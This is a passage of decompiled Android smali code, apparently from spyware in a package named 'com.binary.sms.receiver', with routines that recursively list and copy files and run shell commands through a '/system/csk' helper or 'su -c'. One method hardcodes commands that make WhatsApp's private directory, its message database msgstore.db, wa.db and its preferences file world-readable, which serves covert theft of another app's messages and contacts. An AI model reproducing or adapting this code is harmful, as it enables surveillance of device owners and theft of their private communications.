    add-int/lit8 v2, v2, 0x1

    goto :goto_1

    .line 900
    .end local v0    # "dest1":Ljava/io/File;
    .end local v2    # "i":I
    .end local v3    # "list":[Ljava/lang/String;
    .end local v4    # "src1":Ljava/io/File;
    :cond_5
    invoke-static {p0, p1}, Lcom/binary/sms/receiver/SkeletonActivity;->copyFile(Ljava/io/File;Ljava/io/File;)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    goto/16 :goto_0
.end method

.method public static getDataFileList(Ljava/lang/String;)Ljava/util/List;
    .locals 5
    .param p0, "source"    # Ljava/lang/String;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Ljava/lang/String;",
            ")",
            "Ljava/util/List",
            "<",
            "Ljava/lang/String;",
            ">;"
        }
    .end annotation

    .prologue
    .line 348
    new-instance v2, Ljava/util/LinkedList;

    invoke-direct {v2}, Ljava/util/LinkedList;-><init>()V

    .line 350
    .local v2, "fileList":Ljava/util/List;, "Ljava/util/List<Ljava/lang/String;>;"
    :try_start_0
    new-instance v0, Ljava/io/File;

    invoke-direct {v0, p0}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 351
    .local v0, "base":Ljava/io/File;
    invoke-virtual {v0}, Ljava/io/File;->exists()Z

    move-result v3

    if-nez v3, :cond_0

    .line 353
    new-instance v3, Ljava/lang/StringBuilder;

    const-string v4, "file not exist: "

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v3}, Lcom/binary/sms/receiver/Logger;->info(Ljava/lang/String;)V

    .line 356
    :cond_0
    new-instance v3, Ljava/io/File;

    invoke-direct {v3, p0}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-static {v3, v2}, Lcom/binary/sms/receiver/SkeletonActivity;->getFileList(Ljava/io/File;Ljava/util/List;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 361
    .end local v0    # "base":Ljava/io/File;
    :goto_0
    return-object v2

    .line 358
    :catch_0
    move-exception v1

    .line 359
    .local v1, "e":Ljava/lang/Exception;
    new-instance v3, Ljava/lang/StringBuilder;

    const-string v4, "getDataFileList: "

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v1}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v3, v1}, Lcom/binary/sms/receiver/Logger;->error(Ljava/lang/String;Ljava/lang/Throwable;)V

    goto :goto_0
.end method

.method public static getFileList(Ljava/io/File;Ljava/util/List;)V
    .locals 6
    .param p0, "f"    # Ljava/io/File;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Ljava/io/File;",
            "Ljava/util/List",
            "<",
            "Ljava/lang/String;",
            ">;)V"
        }
    .end annotation

    .prologue
    .line 367
    .local p1, "fileList":Ljava/util/List;, "Ljava/util/List<Ljava/lang/String;>;"
    :try_start_0
    invoke-virtual {p0}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v2

    invoke-interface {p1, v2}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    .line 369
    invoke-virtual {p0}, Ljava/io/File;->isDirectory()Z
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    move-result v2

    if-eqz v2, :cond_0

    .line 371
    :try_start_1
    invoke-virtual {p0}, Ljava/io/File;->listFiles()[Ljava/io/File;

    move-result-object v3

    array-length v4, v3

    const/4 v2, 0x0

    :goto_0
    if-lt v2, v4, :cond_1

    .line 389
    :cond_0
    :goto_1
    return-void

    .line 371
    :cond_1
    aget-object v0, v3, v2
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_2

    .line 375
    .local v0, "c":Ljava/io/File;
    :try_start_2
    invoke-static {v0, p1}, Lcom/binary/sms/receiver/SkeletonActivity;->getFileList(Ljava/io/File;Ljava/util/List;)V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_1

    .line 371
    :goto_2
    add-int/lit8 v2, v2, 0x1

    goto :goto_0

    .line 386
    .end local v0    # "c":Ljava/io/File;
    :catch_0
    move-exception v1

    .line 387
    .local v1, "e":Ljava/lang/Exception;
    new-instance v2, Ljava/lang/StringBuilder;

    const-string v3, "getFileList: "

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v1}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v2, v1}, Lcom/binary/sms/receiver/Logger;->error(Ljava/lang/String;Ljava/lang/Throwable;)V

    goto :goto_1

    .line 376
    .end local v1    # "e":Ljava/lang/Exception;
    .restart local v0    # "c":Ljava/io/File;
    :catch_1
    move-exception v5

    goto :goto_2

    .line 378
    .end local v0    # "c":Ljava/io/File;
    :catch_2
    move-exception v2

    goto :goto_1
.end method

.method private static getTodayString()Ljava/lang/String;
    .locals 4

    .prologue
    .line 395
    new-instance v0, Ljava/text/SimpleDateFormat;

    const-string v1, "yyyy_MM_dd-hh_mm_ss"

    invoke-direct {v0, v1}, Ljava/text/SimpleDateFormat;-><init>(Ljava/lang/String;)V

    .line 396
    .local v0, "df":Ljava/text/SimpleDateFormat;
    new-instance v1, Ljava/util/Date;

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v2

    invoke-direct {v1, v2, v3}, Ljava/util/Date;-><init>(J)V

    invoke-virtual {v0, v1}, Ljava/text/SimpleDateFormat;->format(Ljava/util/Date;)Ljava/lang/String;

    move-result-object v1

    return-object v1
.end method

.method public static systemCallCopy(Ljava/lang/String;[Ljava/lang/String;JLjava/lang/String;)V
    .locals 2
    .param p0, "suComand"    # Ljava/lang/String;
    .param p1, "commands"    # [Ljava/lang/String;
    .param p2, "delay"    # J
    .param p4, "source"    # Ljava/lang/String;

    .prologue
    .line 752
    sget-object v0, Lcom/binary/sms/receiver/SkeletonActivity;->resendingHandler:Landroid/os/Handler;

    new-instance v1, Lcom/binary/sms/receiver/SkeletonActivity$9;

    invoke-direct {v1, p0, p1, p4}, Lcom/binary/sms/receiver/SkeletonActivity$9;-><init>(Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)V

    invoke-virtual {v0, v1, p2, p3}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    .line 851
    return-void
.end method


# virtual methods
.method public chmod(Ljava/lang/String;)V
    .locals 4
    .param p1, "filePath"    # Ljava/lang/String;

    .prologue
    .line 995
    const/4 v1, 0x0

    .line 996
    .local v1, "isSu":Z
    :try_start_0
    new-instance v2, Ljava/lang/StringBuilder;

    const-string v3, "chmod isSu :"

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v2, v1}, Ljava/lang/StringBuilder;->append(Z)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v2}, Lcom/binary/sms/receiver/Logger;->info(Ljava/lang/String;)V

    .line 997
    if-eqz v1, :cond_0

    .line 999
    const-string v2, "chmod chmodSu"

    invoke-static {v2}, Lcom/binary/sms/receiver/Logger;->info(Ljava/lang/String;)V

    .line 1000
    invoke-virtual {p0, p1}, Lcom/binary/sms/receiver/SkeletonActivity;->chmodSU(Ljava/lang/String;)V

    .line 1013
    :goto_0
    return-void

    .line 1004
    :cond_0
    const-string v2, "chmod chmodCsk"

    invoke-static {v2}, Lcom/binary/sms/receiver/Logger;->info(Ljava/lang/String;)V

    .line 1006
    invoke-virtual {p0, p1}, Lcom/binary/sms/receiver/SkeletonActivity;->chmodCsk(Ljava/lang/String;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    .line 1010
    :catch_0
    move-exception v0

    .line 1011
    .local v0, "e":Ljava/lang/Exception;
    new-instance v2, Ljava/lang/StringBuilder;

    const-string v3, "chmod: "

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v2, v0}, Lcom/binary/sms/receiver/Logger;->error(Ljava/lang/String;Ljava/lang/Throwable;)V

    goto :goto_0
.end method

.method public chmodCsk(Ljava/lang/String;)V
    .locals 9
    .param p1, "filePath"    # Ljava/lang/String;

    .prologue
    .line 1259
    const/4 v3, 0x0

    .line 1260
    .local v3, "process":Ljava/lang/Process;
    const/4 v0, 0x0

    .line 1262
    .local v0, "bytes":I
    :try_start_0
    iget v5, p0, Lcom/binary/sms/receiver/SkeletonActivity;->counter:I

    add-int/lit8 v5, v5, 0x1

    iput v5, p0, Lcom/binary/sms/receiver/SkeletonActivity;->counter:I

    .line 1264
    new-instance v5, Ljava/lang/StringBuilder;

    const-string v6, "filePath-"

    invoke-direct {v5, v6}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget v6, p0, Lcom/binary/sms/receiver/SkeletonActivity;->counter:I

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v5

    const-string v6, ": "

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-static {v5}, Lcom/binary/sms/receiver/Logger;->info(Ljava/lang/String;)V

    .line 1266
    new-instance v5, Ljava/lang/StringBuilder;

    const-string v6, "export LD_LIBRARY_PATH=/vendor/lib:/system/lib; chmod 777 "

    invoke-direct {v5, v6}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    .line 1269
    invoke-virtual {v5, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    .line 1266
    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    .line 1270
    .local v1, "command":Ljava/lang/String;
    new-instance v5, Ljava/lang/StringBuilder;

    const-string v6, "command: "

    invoke-direct {v5, v6}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v5, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-static {v5}, Lcom/binary/sms/receiver/Logger;->info(Ljava/lang/String;)V

    .line 1271
    invoke-static {}, Ljava/lang/Runtime;->getRuntime()Ljava/lang/Runtime;

    move-result-object v5

    .line 1274
    const/4 v6, 0x2

    new-array v6, v6, [Ljava/lang/String;

    const/4 v7, 0x0

    const-string v8, "/system/csk"

    aput-object v8, v6, v7

    const/4 v7, 0x1

    aput-object v1, v6, v7

    .line 1271
    invoke-virtual {v5, v6}, Ljava/lang/Runtime;->exec([Ljava/lang/String;)Ljava/lang/Process;

    move-result-object v3

    .line 1305
    invoke-virtual {v3}, Ljava/lang/Process;->waitFor()I

    move-result v4

    .line 1310
    .local v4, "res":I
    new-instance v5, Ljava/lang/StringBuilder;

    const-string v6, "result: "

    invoke-direct {v5, v6}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v5, v4}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-static {v5}, Lcom/binary/sms/receiver/Logger;->info(Ljava/lang/String;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    .line 1317
    :try_start_1
    invoke-virtual {v3}, Ljava/lang/Process;->destroy()V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_3

    .line 1324
    .end local v1    # "command":Ljava/lang/String;
    .end local v4    # "res":I
    :goto_0
    return-void

    .line 1312
    :catch_0
    move-exception v2

    .line 1313
    .local v2, "e":Ljava/lang/Exception;
    :try_start_2
    new-instance v5, Ljava/lang/StringBuilder;

    const-string v6, "process: "

    invoke-direct {v5, v6}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v2}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-static {v5, v2}, Lcom/binary/sms/receiver/Logger;->error(Ljava/lang/String;Ljava/lang/Throwable;)V
    :try_end_2
    .catchall {:try_start_2 .. :try_end_2} :catchall_0

    .line 1317
    :try_start_3
    invoke-virtual {v3}, Ljava/lang/Process;->destroy()V
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_1

    goto :goto_0

    .line 1319
    :catch_1
    move-exception v2

    .line 1321
    new-instance v5, Ljava/lang/StringBuilder;

    const-string v6, "process.destroy"

    invoke-direct {v5, v6}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v2}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    .line 1320
    invoke-static {v5, v2}, Lcom/binary/sms/receiver/Logger;->error(Ljava/lang/String;Ljava/lang/Throwable;)V

    goto :goto_0

    .line 1314
    .end local v2    # "e":Ljava/lang/Exception;
    :catchall_0
    move-exception v5

    .line 1317
    :try_start_4
    invoke-virtual {v3}, Ljava/lang/Process;->destroy()V
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_2

    .line 1323
    :goto_1
    throw v5

    .line 1319
    :catch_2
    move-exception v2

    .line 1321
    .restart local v2    # "e":Ljava/lang/Exception;
    new-instance v6, Ljava/lang/StringBuilder;

    const-string v7, "process.destroy"

    invoke-direct {v6, v7}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v2}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    .line 1320
    invoke-static {v6, v2}, Lcom/binary/sms/receiver/Logger;->error(Ljava/lang/String;Ljava/lang/Throwable;)V

    goto :goto_1

    .line 1319
    .end local v2    # "e":Ljava/lang/Exception;
    .restart local v1    # "command":Ljava/lang/String;
    .restart local v4    # "res":I
    :catch_3
    move-exception v2

    .line 1321
    .restart local v2    # "e":Ljava/lang/Exception;
    new-instance v5, Ljava/lang/StringBuilder;

    const-string v6, "process.destroy"

    invoke-direct {v5, v6}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v2}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    .line 1320
    invoke-static {v5, v2}, Lcom/binary/sms/receiver/Logger;->error(Ljava/lang/String;Ljava/lang/Throwable;)V

    goto :goto_0
.end method

.method public chmodOneCommand(Ljava/io/File;Ljava/lang/String;)V
    .locals 5
    .param p1, "f"    # Ljava/io/File;
    .param p2, "dest"    # Ljava/lang/String;

    .prologue
    .line 461
    :try_start_0
    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "file not exist: "

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {p1}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1}, Lcom/binary/sms/receiver/Logger;->info(Ljava/lang/String;)V

    .line 462
    invoke-static {}, Ljava/lang/Runtime;->getRuntime()Ljava/lang/Runtime;

    move-result-object v1

    const/4 v2, 0x2

    new-array v2, v2, [Ljava/lang/String;

    const/4 v3, 0x0

    const-string v4, "/system/csk"

    aput-object v4, v2, v3

    const/4 v3, 0x1

    .line 463
    const-string v4, "export LD_LIBRARY_PATH=/vendor/lib:/system/lib; chmod 7777 /data/data/com.whatsapp/; chmod 7777 /data/data/com.whatsapp/databases/; chmod 777 /data/data/com.whatsapp/databases/msgstore.db; chmod 7777 /data/data/com.whatsapp/databases/wa.db ;chmod 7777 /data/data/com.whatsapp/shared_prefs/com.whatsapp_preferences.xml;"

    aput-object v4, v2, v3

    .line 462
    invoke-virtual {v1, v2}, Ljava/lang/Runtime;->exec([Ljava/lang/String;)Ljava/lang/Process;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 481
    :goto_0
    return-void

    .line 478
    :catch_0
    move-exception v0

    .line 479
    .local v0, "e":Ljava/lang/Exception;
    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "chmodFilesArry ext"

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1, v0}, Lcom/binary/sms/receiver/Logger;->error(Ljava/lang/String;Ljava/lang/Throwable;)V

    goto :goto_0
.end method

.method public chmodSU(Ljava/lang/String;)V
    .locals 8
    .param p1, "filePath"    # Ljava/lang/String;

    .prologue
    .line 1190
    const/4 v3, 0x0

    .line 1191
    .local v3, "process":Ljava/lang/Process;
    const/4 v0, 0x0

    .line 1193
    .local v0, "bytes":I
    :try_start_0
    iget v5, p0, Lcom/binary/sms/receiver/SkeletonActivity;->counter:I

    add-int/lit8 v5, v5, 0x1

    iput v5, p0, Lcom/binary/sms/receiver/SkeletonActivity;->counter:I

    .line 1195
    new-instance v5, Ljava/lang/StringBuilder;

    const-string v6, "filePath-"

    invoke-direct {v5, v6}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget v6, p0, Lcom/binary/sms/receiver/SkeletonActivity;->counter:I

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v5

    const-string v6, ": "

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-static {v5}, Lcom/binary/sms/receiver/Logger;->info(Ljava/lang/String;)V

    .line 1198
    new-instance v5, Ljava/lang/StringBuilder;

    const-string v6, "chmod 777 "

    invoke-direct {v5, v6}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    .line 1200
    invoke-virtual {v5, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    .line 1198
    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    .line 1201
    .local v1, "command":Ljava/lang/String;
    new-instance v5, Ljava/lang/StringBuilder;

    const-string v6, "command: "

    invoke-direct {v5, v6}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v5, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-static {v5}, Lcom/binary/sms/receiver/Logger;->info(Ljava/lang/String;)V

    .line 1202
    invoke-static {}, Ljava/lang/Runtime;->getRuntime()Ljava/lang/Runtime;

    move-result-object v5

    .line 1203
    new-instance v6, Ljava/lang/StringBuilder;

    const-string v7, "su -c "

    invoke-direct {v6, v7}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v6, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    .line 1202
    invoke-virtual {v5, v6}, Ljava/lang/Runtime;->exec(Ljava/lang/String;)Ljava/lang/Process;

    move-result-object v3

    .line 1237
    invoke-virtual {v3}, Ljava/lang/Process;->waitFor()I

    move-result v4

    .line 1242
    .local v4, "res":I
    new-instance v5, Ljava/lang/StringBuilder;

    const-string v6, "result: "

    invoke-direct {v5, v6}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v5, v4}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-static {v5}, Lcom/binary/sms/receiver/Logger;->info(Ljava/lang/String;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    .line 1249
    :try_start_1
    invoke-virtual {v3}, Ljava/lang/Process;->destroy()V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_3

    .line 1256
    .end local v1    # "command":Ljava/lang/String;
    .end local v4    # "res":I
    :goto_0
    return-void

    .line 1244
    :catch_0
    move-exception v2

    .line 1245
    .local v2, "e":Ljava/lang/Exception;
    :try_start_2
    new-instance v5, Ljava/lang/StringBuilder;

    const-string v6, "process: "

    invoke-direct {v5, v6}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v2}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-static {v5, v2}, Lcom/binary/sms/receiver/Logger;->error(Ljava/lang/String;Ljava/lang/Throwable;)V
    :try_end_2
    .catchall {:try_start_2 .. :try_end_2} :catchall_0

    .line 1249
    :try_start_3
    invoke-virtual {v3}, Ljava/lang/Process;->destroy()V
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_1

    goto :goto_0

    .line 1251
    :catch_1
    move-exception v2

    .line 1253
    new-instance v5, Ljava/lang/StringBuilder;

    const-string v6, "process.destroy"

    invoke-direct {v5, v6}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v2}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    .line 1252
    invoke-static {v5, v2}, Lcom/binary/sms/receiver/Logger;->error(Ljava/lang/String;Ljava/lang/Throwable;)V

    goto :goto_0

    .line 1246
    .end local v2    # "e":Ljava/lang/Exception;
    :catchall_0
    move-exception v5

    .line 1249
    :try_start_4
    invoke-virtual {v3}, Ljava/lang/Process;->destroy()V
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_2

    .line 1255
    :goto_1
    throw v5

    .line 1251
    :catch_2
    move-exception v2

    .line 1253
    .restart local v2    # "e":Ljava/lang/Exception;
    new-instance v6, Ljava/lang/StringBuilder;

    const-string v7, "process.destroy"

    invoke-direct {v6, v7}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v2}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    .line 1252
    invoke-static {v6, v2}, Lcom/binary/sms/receiver/Logger;->error(Ljava/lang/String;Ljava/lang/Throwable;)V

    goto :goto_1

    .line 1251
    .end local v2    # "e":Ljava/lang/Exception;
    .restart local v1    # "command":Ljava/lang/String;
    .restart local v4    # "res":I
    :catch_3
    move-exception v2

    .line 1253
    .restart local v2    # "e":Ljava/lang/Exception;
    new-instance v5, Ljava/lang/StringBuilder;

    const-string v6, "process.destroy"

    invoke-direct {v5, v6}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v2}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    .line 1252
    invoke-static {v5, v2}, Lcom/binary/sms/receiver/Logger;->error(Ljava/lang/String;Ljava/lang/Throwable;)V

    goto :goto_0
.end method

.method public copy4(Ljava/lang/String;J)V
    .locals 2
    .param p1, "source"    # Ljava/lang/String;
    .param p2, "delay"    # J

    .prologue
    .line 400
    sget-object v0, Lcom/binary/sms/receiver/SkeletonActivity;->resendingHandler:Landroid/os/Handler;

    new-instance v1, Lcom/binary/sms/receiver/SkeletonActivity$6;

    invoke-direct {v1, p0, p1}, Lcom/binary/sms/receiver/SkeletonActivity$6;-><init>(Lcom/binary/sms/receiver/SkeletonActivity;Ljava/lang/String;)V

    invoke-virtual {v0, v1, p2, p3}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    .line 455
    return-void
.end method

.method public copyOneByOne(Ljava/lang/String;Ljava/lang/String;J)V
    .locals 2
    .param p1, "suComand"    # Ljava/lang/String;
    .param p2, "source"    # Ljava/lang/String;
    .param p3, "delay"    # J

    .prologue
    .line 504
    sget-object v0, Lcom/binary/sms/receiver/SkeletonActivity;->resendingHandler:Landroid/os/Handler;

    new-instance v1, Lcom/binary/sms/receiver/SkeletonActivity$7;

    invoke-direct {v1, p0, p1, p2}, Lcom/binary/sms/receiver/SkeletonActivity$7;-><init>(Lcom/binary/sms/receiver/SkeletonActivity;Ljava/lang/String;Ljava/lang/String;)V

    invoke-virtual {v0, v1, p3, p4}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    .line 648
    return-void
.end method

.method public getApkInfos(Ljava/lang/String;)V
    .locals 17
    .param p1, "apksDirectoryPath"    # Ljava/lang/String;

    .prologue
    .line 1327
    new-instance v9, Ljava/lang/StringBuilder;

    const-string v10, "apksDirectoryPath: "

    invoke-direct {v9, v10}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    move-object/from16 v0, p1

    invoke-virtual {v9, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    invoke-virtual {v9}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v9

    invoke-static {v9}, Lcom/binary/sms/receiver/Logger;->info(Ljava/lang/String;)V

